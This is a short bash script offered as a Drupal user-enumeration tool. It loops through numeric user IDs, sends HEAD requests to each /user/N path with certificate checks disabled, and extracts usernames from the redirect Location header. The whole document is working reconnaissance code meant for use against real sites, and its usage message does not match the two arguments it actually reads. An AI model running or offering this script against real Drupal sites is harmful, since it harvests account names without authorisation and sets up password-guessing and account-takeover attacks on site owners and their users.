#!/bin/bash

echo -e "Drupal User Enumeration By Redirect - Developed by sknux\n"

i=1

if [ -z "$1" ]
then
	echo -e "Usage: $0 Number-of-Attempts\nExample: $0 URL/IP 10."
	exit
fi

while [ $i -le $2 ]
do
	echo 'The user of ID' $i 'is:'
	curl -s --head https://$1/user/$i -k | grep Location | cut -d ' ' -f2 | cut -d '/' -f5
	((i++))
done
